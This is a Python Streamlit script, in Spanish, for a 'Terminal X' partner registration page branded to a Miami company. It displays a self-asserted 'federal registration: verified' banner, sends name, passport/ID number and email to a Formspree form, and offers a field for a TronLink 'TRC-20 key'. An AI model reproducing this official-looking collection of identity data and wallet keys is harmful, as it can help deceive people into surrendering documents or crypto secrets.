import streamlit as st

# 1. IDENTIDAD FEDERAL (CONFIGURACIÓN)
st.set_page_config(page_title="Terminal X - Mando Miami", layout="wide")

# 2. CABECERA ESTRUCTURAL (EL ESCUDO ES EL NOMBRE)
with st.container():
    st.title("🏗️ TERMINAL X: RASCACIELOS GRÁFICO")
    st.subheader("PHELPS TUCKER GROUP LLC")
    st.write("📍 **Sede Global:** 8345 NW 66st Miami, Florida, USA 33166")
    st.markdown(f"""
        <div style="padding: 10px; border-left: 5px solid #238636; background-color: #161b22;">
            <strong>REGISTRO FEDERAL:</strong> FRN-0038392759 | <strong>ESTATUS:</strong> VERIFICADO
        </div>
    """, unsafe_allow_html=True)

st.divider()

# 3. MÓDULO DE REGISTRO (CONEXIÓN SEGURA)
st.header("👤 REGISTRO DE SOCIOS")
st.success("🛰️ Enlace de Datos Miami 33166: OPERATIVO")

# Su ID de Formspree ya está verificado en las capturas anteriores
form_id = "mvzlvnyn"

registro_html = f"""
<div style="background-color: #0d1117; padding: 20px; border-radius: 10px; border: 1px solid #30363d; color: white;">
    <form action="https://formspree.io/f/{form_id}" method="POST">
        <label style="color: #8b949e;">NOMBRE Y APELLIDO:</label><br>
        <input type="text" name="name" style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white;" required><br>
        
        <label style="color: #8b949e;">ID / PASAPORTE:</label><br>
        <input type="text" name="id" style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white;" required><br>
        
        <label style="color: #8b949e;">CORREO ELECTRÓNICO:</label><br>
        <input type="email" name="_replyto" style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white;" required><br>
        
        <input type="hidden" name="_subject" value="NUEVO SOCIO: PHELPS TUCKER GROUP">
        <button type="submit" style="width: 100%; padding: 15px; background-color: #238636; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">
            ACTIVAR PERFIL FEDERAL
        </button>
    </form>
</div>
"""
st.components.v1.html(registro_html, height=450)

# 4. SISTEMA TRONLINK (SINCRONIZACIÓN)
st.divider()
st.header("🔑 VINCULACIÓN TRONLINK")
st.text_input("Llave TRC-20:", placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
if st.button("Sincronizar Bóveda"):
    st.info("Estableciendo conexión con la red Tron...")

# 5. PIE DE PÁGINA
st.divider()
st.caption("Fuerza y Honor. Operación Miami | Registro Federal: FRN-0038392759")
